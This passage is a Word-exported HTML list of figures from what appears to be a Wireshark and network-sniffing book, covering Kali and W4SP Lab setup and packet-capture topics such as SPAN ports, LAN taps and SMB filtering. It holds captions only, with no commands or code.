>Figure 2-21: Storage on physical disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark123" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-22: Virtual disk size</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark125" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-23: Enabling PAE</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark128" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-24: Selecting start-up disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark131" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-25: Kali boot menu</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:168.9000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark133" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-26: Possible temporary error</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark136" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-27: Entering a hostname</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark138" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-28: Skipping the domain</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark141" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-29: Entering a root password</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark143" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-30: Partitioning the disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark146" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-31: Confirming the disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section5" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:133.4500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark148" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-32: Confirming a single partition</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark150" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-33: Writing changes to the disk</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark153" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-34: Confirming disk &nbsp;changes</span></u></a></span><span><a href="#_bookmark155" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 2-35: The installation progress bar</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark158" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-36: The option for a network</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >mirror</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark160" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-37: Network connection proxy</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark162" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-38: GRUB boot</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.3000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >loader</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark165" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-39: Installation is complete</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark169" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-40: System settings</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark173" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-41: New user w4sp-lab</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark176" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-42: Firefox to &nbsp;GitHub</span></u></a></span><span><a href="#_bookmark178" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 2-43: Saving the W4SP Lab file</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark181" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-44: Opening Terminal</span></u></a></span><span><a href="#_bookmark184" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 2-45: Unzipping the W4SP</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.1000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Lab</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.2000pt;margin-right:52.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark186" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-46: Running the W4SP Lab installation script</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark189" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-47: Running the W4SP Lab setup</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:114.0000pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark192" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 2-48: The full W4SP Lab network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 3: The Fundamentals</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:149.7500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark204" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-1: OSI layers in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark208" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 3-2: VirtualBox networking</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.2500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >options</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark215" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-3: Malware signature code</span></u></a></span><span><a href="#_bookmark221" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 3-4: Small Incoming Layer 2</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.1500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >frame</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark223" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-5: Smaller outgoing Layer 2 frame</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark227" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-6: Gratuitous ARP</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark230" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 3-7: TCP&#8217;s 3-way handshake</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Chapter 4: Capturing Packets</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section6" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:181.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark244" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-1: The Capture interfaces</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.2500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >list</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark246" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-2: Superuser warning</span></u></a></span><span><a href="#_bookmark249" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 4-3: New</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.2500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >traffic</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:114.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark252" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-4: Renaming a network interface</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark264" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-5: Sample localhost ICMP traffic</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:52.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark267" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-6: Installing the loopback adapter on Windows</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark270" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-7: RawCap loopback sniffing</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:145.3500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark273" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-8: RawCap pcap in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark276" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-9: VirtualBox bridging</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:110.5000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark279" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-10: Wireshark sniffing bridged</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-1.5000pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >network</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark284" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-11: Capturing packets with a hub</span></u></a></span><span><a href="#_bookmark287" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;Figure 4-12: Traffic when sniffing on a hub</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark290" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-13: SPAN sniffing</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);letter-spacing:-0.4500pt;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >&nbsp;</span></u><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >connections</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-left:53.0000pt;" ><span><a href="#_bookmark296" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-14: Throwing star LAN tap</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7000pt;margin-right:75.4500pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark299" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-15: Traffic flow when sniffing a Linux bridge</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark304" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-16: Raw wireless packets in Wireshark</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark309" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-17: The File Save dialog box</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:168.9000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark314" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-18: Properties of a capture file</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark319" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-19: Multiple file settings</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark322" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-20: Stop capture options</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-right:90.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark324" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-21: Setting multiple files and ring buffer</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark327" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-22: Resultant ring buffer files</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:207.6000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark330" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-23: Mergecap verbose</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark332" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-24: Mergecap complete</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark335" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-25: Clearing recent files</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:53.0000pt;" ><span><a href="#_bookmark337" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-26: Changing the number of recent files shown</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section7" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:129.8000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark341" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-27: Wireshark&#8217;s Decode As window</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark344" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-28: Wireshark&#8217;s Decode As window</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark347" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-29: Packet list filtering for SMB</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark350" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-30: SMB packets referencing a file</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.1500pt;margin-right:90.0000pt;margin-left:53.0000pt;line-height:145%;" ><span><a href="#_bookmark353" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-31: Packet list filtered for NT Create calls</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span><span><a href="#_bookmark357" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-32: Adjusting packet colors</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.0500pt;margin-right:178.7000pt;margin-left:30.5000pt;text-indent:22.5000pt;line-height:145%;" ><span><a href="#_bookmark360" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 4-33: Colorizing conversations</span></u></a></span><span 